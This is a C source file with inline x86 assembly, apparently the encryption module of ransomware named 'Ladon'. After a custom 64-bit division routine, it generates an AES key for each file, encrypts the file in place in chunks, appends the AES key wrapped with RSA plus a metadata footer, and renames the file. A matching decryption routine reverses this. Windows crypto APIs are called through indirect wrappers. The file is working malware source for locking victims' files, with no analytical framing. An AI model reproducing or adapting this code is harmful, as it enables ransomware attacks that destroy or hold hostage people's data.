#include "ladon.h"

#define CRT_LOWORD(x) dword ptr [x+0]
#define CRT_HIWORD(x) dword ptr [x+4]
__declspec(naked) void _alldvrm()
{
#define DVND    esp + 16     
#define DVSR    esp + 24     
	__asm
	{
		push    edi
		push    esi
		push    ebp


		xor     edi, edi
		xor     ebp, ebp

		mov     eax, CRT_HIWORD(DVND)
		or eax, eax
		jge     short L1
		inc     edi; complement result sign flag
		inc     ebp; complement result sign flag
		mov     edx, CRT_LOWORD(DVND); lo word of a
		neg     eax; make a positive
		neg     edx
		sbb     eax, 0
		mov     CRT_HIWORD(DVND), eax; save positive value
		mov     CRT_LOWORD(DVND), edx
		L1 :
		mov     eax, CRT_HIWORD(DVSR); hi word of b
			or eax, eax; test to see if signed
			jge     short L2; skip rest if b is already positive
			inc     edi; complement the result sign flag
			mov     edx, CRT_LOWORD(DVSR); lo word of a
			neg     eax; make b positive
			neg     edx
			sbb     eax, 0
			mov     CRT_HIWORD(DVSR), eax; save positive value
			mov     CRT_LOWORD(DVSR), edx
			L2 :


			jnz     short L3
			mov     ecx, CRT_LOWORD(DVSR); load divisor
			mov     eax, CRT_HIWORD(DVND); load high word of dividend
			xor     edx, edx
			div     ecx; eax <-high order bits of quotient
			mov     ebx, eax; save high bits of quotient
			mov     eax, CRT_LOWORD(DVND); edx:eax <-remainder : lo word of dividend
			div     ecx; eax <-low order bits of quotient
			mov     esi, eax; ebx:esi <-quotient
	
		mov     eax, ebx; set up high word of quotient
			mul     CRT_LOWORD(DVSR); CRT_HIWORD(QUOT) * DVSR
			mov     ecx, eax; save the result in ecx
			mov     eax, esi; set up low word of quotient
			mul     CRT_LOWORD(DVSR); CRT_LOWORD(QUOT) * DVSR
			add     edx, ecx; EDX:EAX = QUOT * DVSR
			jmp     short L4; complete remainder calculation

			;
		; Here we do it the hard way.Remember, eax contains the high word of DVSR
			;

	L3:
		mov     ebx, eax; ebx:ecx <-divisor
			mov     ecx, CRT_LOWORD(DVSR)
			mov     edx, CRT_HIWORD(DVND); edx:eax <-dividend
			mov     eax, CRT_LOWORD(DVND)
			L5 :
			shr     ebx, 1; shift divisor right one bit
			rcr     ecx, 1
			shr     edx, 1; shift dividend right one bit
			rcr     eax, 1
			or ebx, ebx
			jnz     short L5; loop until divisor < 4194304K
			div     ecx; now divide, ignore remainder
			mov     esi, eax; save quotient

			;
		; We may be off by one, so to check, we will multiply the quotient
			; by the divisor and check the result against the orignal dividend
			; Note that we must also check for overflow, which can occur if the
			; dividend is close to 2 * *64 and the quotient is off by 1.
			;

		mul     CRT_HIWORD(DVSR); QUOT * CRT_HIWORD(DVSR)
			mov     ecx, eax
			mov     eax, CRT_LOWORD(DVSR)
			mul     esi; QUOT * CRT_LOWORD(DVSR)
			add     edx, ecx; EDX:EAX = QUOT * DVSR
			jc      short L6; carry means Quotient is off by 1

			;
		; do long compare here between original dividend and the result of the
			; multiply in edx : eax.If original is larger or equal, we are ok, otherwise
			; subtract one(1) from the quotient.
			;

		cmp     edx, CRT_HIWORD(DVND); compare hi words of result and original
			ja      short L6; if result > original, do subtract
			jb      short L7; if result < original, we are ok
			cmp     eax, CRT_LOWORD(DVND); hi words are equal, compare lo words
			jbe     short L7; if less or equal we are ok, else subtract
			L6 :
		dec     esi; subtract 1 from quotient
			sub     eax, CRT_LOWORD(DVSR); subtract divisor from result
			sbb     edx, CRT_HIWORD(DVSR)
			L7:
		xor     ebx, ebx; ebx:esi <-quotient

			L4 :
		;
		; Calculate remainder by subtracting the result from the original dividend.
			; Since the result is already in a register, we will do the subtract in the
			; opposite direction and negate the result if necessary.
			;

		sub     eax, CRT_LOWORD(DVND); subtract dividend from result
			sbb     edx, CRT_HIWORD(DVND)

			;
		; Now check the result sign flag to see if the result is supposed to be positive
			; or negative.It is currently negated(because we subtracted in the 'wrong'
				; direction), so if the sign flag is set we are done, otherwise we must negate
			; the result to make it positive again.
			;

		dec     ebp; check result sign flag
			jns     short L9; result is ok, set up the quotient
			neg     edx; otherwise, negate the result
			neg     eax
			sbb     edx, 0

			;
		; Now we need to get the quotient into edx : eax and the remainder into ebx : ecx.
			;
	L9:
		mov     ecx, edx
			mov     edx, ebx
			mov     ebx, ecx
			mov     ecx, eax
			mov     eax, esi

			;
		; Just the cleanup left to do.edx:eax contains the quotient.Set the sign
			; according to the save value, cleanup the stack, and return.
			;

		dec     edi; check to see if result is negative
			jnz     short L8; if EDI == 0, result should be negative
			neg     edx; otherwise, negate the result
			neg     eax
			sbb     edx, 0

			;
		; Restore the saved registers and return.
			;

	L8:
		pop     ebp
			pop     esi
			pop     edi

			ret     16
	}

#undef DVND
#undef DVSR
}

#define LADON_CRYPT_BUFFER_SIZE 4096 /* 4KB */

typedef struct {
	LONGLONG llFileSize;
	DWORD dwKeySize, dwExportedSize, dwBufferSize;
} LADON_CRYPTO_FOOTER;

HCRYPTPROV ghProvAES = 0, ghProvRSA = 0;

BOOL LadonCryptPrepareAES()
{
	if (ghProvAES)
		return TRUE;

	if (!_CryptAcquireContext(&ghProvAES, NULL,
		NULL, PROV_RSA_AES, 0))
	{
		if (_GetLastError() == NTE_BAD_KEYSET)
		{
			return _CryptAcquireContext(&ghProvAES, NULL,
				NULL, PROV_RSA_AES, CRYPT_NEWKEYSET);
		}

		return FALSE;
	}

	return TRUE;
}

VOID LadonCryptDestroyAES()
{
	if (ghProvAES)
		_CryptReleaseContext(ghProvAES, 0);
}

BOOL LadonCryptPrepareRSA()
{
	if (ghProvRSA)
		return TRUE;

	if (!_CryptAcquireContext(&ghProvRSA, NULL,
		MS_ENHANCED_PROV, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
	{
		if (_GetLastError() == NTE_BAD_KEYSET)
		{
			return _CryptAcquireContext(&ghProvRSA, NULL,
				MS_ENHANCED_PROV, PROV_RSA_FULL,
				CRYPT_NEWKEYSET);
		}

		return FALSE;
	}

	return TRUE;
}

VOID LadonCryptDestroyRSA()
{
	if (ghProvRSA)
		_CryptReleaseContext(ghProvRSA, 0);
}

BOOL LadonCryptGenAESKey(HCRYPTKEY *phKeyAES)
{
	return _CryptGenKey(ghProvAES, CALG_AES_128, CRYPT_EXPORTABLE, phKeyAES);
}

BOOL LadonCryptGenRSAKey(HCRYPTKEY *phKeyRSA)
{
	/* generates a 2048-bit rsa public and private-key */
	return _CryptGenKey(ghProvRSA, AT_KEYEXCHANGE, 0x8000000 | CRYPT_EXPORTABLE, phKeyRSA);
}

BOOL LadonCryptImportRSAPrivateKey(HCRYPTKEY *phRSAKey, LPCSTR pvBuffer)
{
	/* PEM format with header and footer only */
	PBYTE pbDerKey = NULL, pbBlob = NULL;
	DWORD dwDerSize = 0, dwBlobSize = 0;
	BOOL bStatus = FALSE;

	/* convert pem to der */
	if (!_CryptStringToBinaryA(pvBuffer, 0, CRYPT_STRING_BASE64HEADER,
		NULL, &dwDerSize, NULL, NULL))
		goto end;

	pbDerKey = (LPBYTE) _HeapAlloc(_GetProcessHeap(), 0, dwDerSize);
	if (!pbDerKey)
		goto end;

	if (!_CryptStringToBinaryA(pvBuffer, 0, CRYPT_STRING_BASE64HEADER,
		pbDerKey, &dwDerSize, NULL, NULL))
		goto end;

	/* convert der to blob */
	if (!_CryptDecodeObjectEx(X509_ASN_ENCODING|PKCS_7_ASN_ENCODING,
		PKCS_RSA_PRIVATE_KEY, pbDerKey + 26, dwDerSize - 26,
		0, NULL, NULL, &dwBlobSize))
		goto end;

	pbBlob = (LPBYTE) _HeapAlloc(GetProcessHeap(), 0, dwBlobSize);
	if (!pbBlob)
		goto end;

	if (!_CryptDecodeObjectEx(X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,
		PKCS_RSA_PRIVATE_KEY, pbDerKey + 26, dwDerSize - 26,
		0, NULL, pbBlob, &dwBlobSize))
		goto end;

	if (!_CryptImportKey(ghProvRSA, pbBlob, dwBlobSize, 0, 0, phRSAKey))
		goto end;

	bStatus = TRUE;
end:
	if (pbDerKey) _HeapFree(_GetProcessHeap(), 0, pbDerKey);
	if (pbBlob) _HeapFree(_GetProcessHeap(), 0, pbBlob);

	return bStatus;
}

BOOL LadonCryptImportRSAPublicKey(HCRYPTKEY *phRSAKey, LPCSTR pvBuffer)
{
	PBYTE pbDerKey = 0;
	DWORD dwDerSize = 0, dwPublicKeyInfoLen = 0;
	BOOL bStatus = FALSE;
	CERT_PUBLIC_KEY_INFO *pPublicKeyInfo = NULL;

	/* convert pem to der */
	if (!_CryptStringToBinaryA(pvBuffer, 0, CRYPT_STRING_BASE64HEADER,
		NULL, &dwDerSize, NULL, NULL))
		goto end;

	pbDerKey = (PBYTE) _HeapAlloc(_GetProcessHeap(), 0, dwDerSize);
	if (!pbDerKey)
		goto end;

	if (!_CryptStringToBinaryA(pvBuffer, 0, CRYPT_STRING_BASE64HEADER,
		pbDerKey, &dwDerSize, NULL, NULL))
		goto end;

	/* convert der to CERT_PUBLIC_KEY_INFO */
	if (!_CryptDecodeObjectEx(X509_ASN_ENCODING, X509_PUBLIC_KEY_INFO,
		pbDerKey, dwDerSize, CRYPT_ENCODE_ALLOC_FLAG, NULL,
		&pPublicKeyInfo, &dwPublicKeyInfoLen))
		goto end;

	if (!_CryptImportPublicKeyInfo(ghProvRSA, X509_ASN_ENCODING,
		pPublicKeyInfo, phRSAKey))
		goto end;

	bStatus = TRUE;
end:
	if (pbDerKey) _HeapFree(_GetProcessHeap(), 0, pbDerKey);
	if (pPublicKeyInfo) _LocalFree(pPublicKeyInfo);

	return bStatus;
}

BOOL LadonCryptImportAESKey(HCRYPTKEY *phAESKey, PVOID pvBuffer,
	DWORD dwBufferLen)
{
	return _CryptImportKey(ghProvAES, (PBYTE)pvBuffer, dwBufferLen,
		(HCRYPTKEY)NULL, 0, phAESKey);
}

DWORD LadonCryptExportedAESKeySize(HCRYPTKEY hAESKey)
{
	DWORD dwBlobLen;

	if (!_CryptExportKey(hAESKey, (HCRYPTKEY)NULL, PLAINTEXTKEYBLOB,
		0, NULL, &dwBlobLen))
		dwBlobLen = 0;

	return dwBlobLen;
}

BOOL LadonCryptExportAESKey(HCRYPTKEY hAESKey, PVOID pvBuffer,
	DWORD dwBufferLen)
{
	return _CryptExportKey(hAESKey, (HCRYPTKEY)NULL, PLAINTEXTKEYBLOB,
		0, (BYTE *)pvBuffer, &dwBufferLen);
}

DWORD LadonCryptEncryptedSize(HCRYPTKEY hKey, DWORD dwSize)
{
	DWORD dwEncryptedSize = dwSize;

	if (!_CryptEncrypt(hKey, 0, TRUE, 0, NULL, &dwEncryptedSize, 0))
		dwEncryptedSize = 0;

	return dwEncryptedSize;
}

BOOL LadonCryptEncryptBlock(HCRYPTKEY hKey, PVOID pvBuffer,
	DWORD dwDataSize, DWORD dwChunkSize)
{
	return _CryptEncrypt(hKey, 0, TRUE, 0, (BYTE *)pvBuffer, &dwDataSize, dwChunkSize);
}

BOOL LadonCryptDecryptBlock(HCRYPTKEY hKey, PVOID pvBuffer, DWORD dwSize)
{
	return _CryptDecrypt(hKey, 0, TRUE, 0, (BYTE *)pvBuffer, &dwSize);
}

VOID LadonCryptDestroyKey(HCRYPTKEY hKey)
{
	_CryptDestroyKey(hKey);
}


BOOL _LadonEncryptFile(HCRYPTKEY hKeyRSA, HCRYPTKEY hKeyAES, HANDLE hFile)
{
	LADON_CRYPTO_FOOTER lcfFooter;
	LARGE_INTEGER liFileSize = { 0 };
	LARGE_INTEGER liFilePointerOld;
	LARGE_INTEGER liFilePointerNew;
	LONGLONG llFileSize;
	PVOID pvExported = NULL, pvBuffer = NULL, pvReadBuffer = NULL;
	DWORD dwKeySize = 0, dwExportedSize = 0, dwBufferSize = LADON_CRYPT_BUFFER_SIZE,
		dwReadAheadSize = 0, dwBufferEncSize = 0, dwChunkSize, dwWritten;
	BOOL bStatus = FALSE;

	/* prepare buffers for holding plaintext and encrypted data */
	dwBufferEncSize = LadonCryptEncryptedSize(hKeyAES, dwBufferSize);

	if (dwBufferEncSize < dwBufferSize)
		goto end;

	pvBuffer = _HeapAlloc(_GetProcessHeap(), 0, dwBufferEncSize);
	if (!pvBuffer)
		goto end;

	dwReadAheadSize = dwBufferEncSize * dwBufferSize;

	pvReadBuffer = _HeapAlloc(_GetProcessHeap(), 0, dwReadAheadSize);
	if (!pvReadBuffer)
		goto end;

	/* get file size */
	if (!_GetFileSizeEx(hFile, &liFileSize))
		goto end;

	llFileSize = liFileSize.QuadPart;

	/* encrypt file */
	for (LONGLONG llIndex = 0; llIndex < llFileSize; llIndex += dwReadAheadSize)
	{
		liFilePointerOld.QuadPart = 0;

		if (!_SetFilePointerEx(hFile, liFilePointerOld, &liFilePointerNew, FILE_CURRENT))
			goto end;

		if (!_ReadFile(hFile, pvReadBuffer, dwReadAheadSize, &dwChunkSize, NULL))
			goto end;

		if (!_SetFilePointerEx(hFile, liFilePointerNew, &liFilePointerOld, FILE_BEGIN))
			goto end;

		for (DWORD dwChunkStart = 0; dwChunkStart < dwReadAheadSize; dwChunkStart += dwBufferSize)
		{
			_memcpy(pvBuffer, (PBYTE)pvReadBuffer + dwChunkStart, dwBufferSize);

			if (!LadonCryptEncryptBlock(hKeyAES, pvBuffer, dwBufferSize, dwBufferEncSize))
				goto end;

			if (!_WriteFile(hFile, pvBuffer, dwBufferEncSize, &dwWritten, NULL))
				goto end;
		}
	}

	/* export aes key and write it to the newly encrypted file */
	dwKeySize = LadonCryptExportedAESKeySize(hKeyAES);
	dwExportedSize = LadonCryptEncryptedSize(hKeyRSA, dwKeySize);

	pvExported = _HeapAlloc(_GetProcessHeap(), 0, dwExportedSize);
	if (!pvExported)
		goto end;

	if (!LadonCryptExportAESKey(hKeyAES, pvExported, dwKeySize))
		goto end;

	if (!LadonCryptEncryptBlock(hKeyRSA, pvExported, dwKeySize, dwExportedSize))
		goto end;

	if (!_WriteFile(hFile, pvExported, dwExportedSize, &dwWritten, NULL))
		goto end;

	if (dwWritten != dwExportedSize)
		goto end;

	/* write ladon footers to file */
	lcfFooter.dwKeySize = dwKeySize;
	lcfFooter.dwExportedSize = dwExportedSize;
	lcfFooter.llFileSize = llFileSize;

	if (!_WriteFile(hFile, &lcfFooter, sizeof(lcfFooter), &dwWritten, NULL))
		goto end;

	if (dwWritten != sizeof(lcfFooter))
		goto end;

	bStatus = TRUE;
end:
	if (pvExported)
	{
		LadonZeroMemory(pvExported, dwExportedSize);
		_HeapFree(_GetProcessHeap(), 0, pvExported);
	}

	if (pvBuffer)
	{
		LadonZeroMemory(pvBuffer, dwBufferEncSize);
		_HeapFree(_GetProcessHeap(), 0, pvBuffer);
	}

	if (pvReadBuffer)
	{
		LadonZeroMemory(pvReadBuffer, dwBufferEncSize);
		_HeapFree(_GetProcessHeap(), 0, pvReadBuffer);
	}

	return bStatus;
}

BOOL _LadonDecryptFile(HCRYPTKEY hKeyRSA, HCRYPTKEY hKeyAES, HANDLE hFile,
	LADON_CRYPTO_FOOTER *plcfFooter)
{
	LARGE_INTEGER liFilePointerEnc;
	LARGE_INTEGER liFilePointerDec;
	LARGE_INTEGER liFilePointerTemp;
	PVOID pvBuffer = NULL;
	DWORD dwBufferSize = LADON_CRYPT_BUFFER_SIZE, dwBufferEncSize = 0, dwChunkSize, dwWritten;
	BOOL bStatus = FALSE;

	/* prepare a buffer for holding plaintext and encrypted data */
	dwBufferEncSize = LadonCryptEncryptedSize(hKeyAES, dwBufferSize);
	if (dwBufferEncSize < dwBufferSize)
		goto end;

	pvBuffer = _HeapAlloc(_GetProcessHeap(), 0, dwBufferEncSize);
	if (!pvBuffer)
		goto end;

	/* decrypt file */
	for (LONGLONG llIndex = 0; llIndex < (plcfFooter->llFileSize / dwBufferEncSize)
		+ (plcfFooter->llFileSize % dwBufferEncSize)? 1: 0
		; llIndex++)
	{
		if (!_ReadFile(hFile, pvBuffer, dwBufferEncSize, &dwChunkSize, NULL))
			goto end;

		liFilePointerTemp.QuadPart = 0;

		if (!_SetFilePointerEx(hFile, liFilePointerTemp, &liFilePointerEnc, FILE_CURRENT))
			goto end;

		liFilePointerDec.QuadPart = llIndex * dwBufferSize;

		if (!_SetFilePointerEx(hFile, liFilePointerDec, &liFilePointerTemp, FILE_BEGIN))
			goto end;

		if (!LadonCryptDecryptBlock(hKeyAES, pvBuffer, dwBufferEncSize))
			goto end;

		if (!_WriteFile(hFile, pvBuffer, dwBufferSize, &dwWritten, NULL))
			goto end;

		if (dwWritten != dwBufferSize)
			goto end;

		if (!_SetFilePointerEx(hFile, liFilePointerEnc, &liFilePointerTemp, FILE_BEGIN))
			goto end;
	}

	bStatus = TRUE;
end:
	if (pvBuffer)
	{
		LadonZeroMemory(pvBuffer, dwBufferEncSize);
		_HeapFree(_GetProcessHeap(), 0, pvBuffer);
	}

	return bStatus;
}

BOOL LadonEncryptFile(HCRYPTKEY hKeyRSA, LPCWSTR lpszIn, LPCWSTR lpszOut)
{
	HANDLE hFile = NULL;
	HCRYPTKEY hKeyAES = 0;
	BOOL bStatus = FALSE;

	if (!LadonCryptGenAESKey(&hKeyAES))
		goto end;

	hFile = _CreateFileW(lpszIn, GENERIC_READ|GENERIC_WRITE, 0, NULL,
		OPEN_EXISTING, FILE_READ_ATTRIBUTES, NULL);
	if (!hFile)
		goto end;

	if (!_LadonEncryptFile(hKeyRSA, hKeyAES, hFile))
		goto end;

	_CloseHandle(hFile);

	_MoveFileW(lpszIn, lpszOut);

	hFile = NULL;
	bStatus = TRUE;
end:
	if (hFile) _CloseHandle(hFile);
	if (hKeyAES) LadonCryptDestroyKey(hKeyAES);

	return bStatus;
}

BOOL LadonDecryptFile(HCRYPTKEY hKeyRSA, LPCWSTR lpszIn, LPCWSTR lpszOut)
{
	LADON_CRYPTO_FOOTER lcfFooter;
	LARGE_INTEGER lOffset;
	PVOID pvKeyAES = NULL;
	HANDLE hFile = NULL;
	HCRYPTKEY hKeyAES = 0;
	DWORD dwRead;
	BOOL bStatus = FALSE;

	hFile = _CreateFileW(lpszIn, GENERIC_READ|GENERIC_WRITE, 0, NULL,
		OPEN_EXISTING, FILE_READ_ATTRIBUTES, NULL);
	if (!hFile)
		goto end;


	/* read footer/metadata */
	_SetFilePointer(hFile, -(LONG) sizeof(lcfFooter), NULL, FILE_END);

	if (!_ReadFile(hFile, &lcfFooter, (LONG) sizeof(lcfFooter), &dwRead, NULL))
		goto end;

	/* read encrypted aes key */
	_SetFilePointer(hFile, -((LONG) sizeof(lcfFooter) + (LONG)
		lcfFooter.dwExportedSize), NULL, FILE_END);

	pvKeyAES = _HeapAlloc(_GetProcessHeap(), 0, lcfFooter.dwExportedSize);
	if (!pvKeyAES)
		goto end;

	if (!_ReadFile(hFile, pvKeyAES, lcfFooter.dwExportedSize, &dwRead, NULL))
		goto end;

	/* decrypt aes key */
	if (!LadonCryptDecryptBlock(hKeyRSA, pvKeyAES, lcfFooter.dwExportedSize))
		goto end;

	/* import decrypted aes key */
	if (!LadonCryptImportAESKey(&hKeyAES, pvKeyAES, lcfFooter.dwKeySize))
		goto end;

	/* rewind file */
	_SetFilePointer(hFile, 0, NULL, FILE_BEGIN);

	if (!_LadonDecryptFile(hKeyRSA, hKeyAES, hFile, &lcfFooter))
		goto end;

	/* truncate file */
	lOffset.QuadPart = lcfFooter.llFileSize;

	_SetFilePointer(hFile, (LONG)lOffset.LowPart, (PLONG)
		&lOffset.HighPart, FILE_BEGIN);
	_SetEndOfFile(hFile);

	_CloseHandle(hFile);

	_MoveFileW(lpszIn, lpszOut);

	hFile = NULL;
	bStatus = TRUE;
end:
	if (pvKeyAES)
	{
		LadonZeroMemory(pvKeyAES, lcfFooter.dwKeySize);
		_HeapFree(_GetProcessHeap(), 0, pvKeyAES);
	}

	if (hFile) _CloseHandle(hFile);
	if (hKeyAES) LadonCryptDestroyKey(hKeyAES);

	return bStatus;
}